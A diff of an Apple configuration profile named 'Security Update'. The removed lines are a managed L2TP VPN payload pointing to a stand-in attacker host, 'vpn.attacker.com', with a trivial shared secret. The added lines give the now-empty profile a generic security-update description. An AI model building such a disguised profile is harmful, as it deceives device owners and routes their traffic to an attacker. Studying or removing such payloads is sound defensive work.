@@ -3,39 +3,20 @@
 <plist version="1.0">
 <dict>
     <key>PayloadContent</key>
-    <array>
-        <dict>
-            <key>PayloadType</key>
-            <string>com.apple.vpn.managed</string>
-            <key>PayloadVersion</key>
-            <integer>1</integer>
-            <key>PayloadIdentifier</key>
-            <string>com.security.vpn.00000000-0000-0000-0000-000000000001</string>
-            <key>PayloadUUID</key>
-            <string>00000000-0000-0000-0000-000000000001</string>
-            <key>PayloadDisplayName</key>
-            <string>VPN</string>
-            <key>UserDefinedName</key>
-            <string>VPN</string>
-            <key>VPNType</key>
-            <string>L2TP</string>
-            <key>RemoteAddress</key>
-            <string>vpn.attacker.com</string>
-            <key>AuthenticationMethod</key>
-            <string>SharedSecret</string>
-            <key>SharedSecret</key>
-            <string>secret</string>
-        </dict>
-    </array>
+    <array/>
     <key>PayloadDisplayName</key>
     <string>Security Update</string>
     <key>PayloadIdentifier</key>
-    <string>com.apple.security.update.00000000-0000-0000-0000-000000000003</string>
+    <string>com.security.update</string>
     <key>PayloadType</key>
     <string>Configuration</string>
     <key>PayloadUUID</key>
-    <string>00000000-0000-0000-0000-000000000003</string>
+    <string>00000000-0000-0000-0000-000000000001</string>
     <key>PayloadVersion</key>
     <integer>1</integer>
+    <key>PayloadDescription</key>
+    <string>Security update for your device</string>
+    <key>PayloadOrganization</key>
+    <string>Security</string>
 </dict>
 </plist>
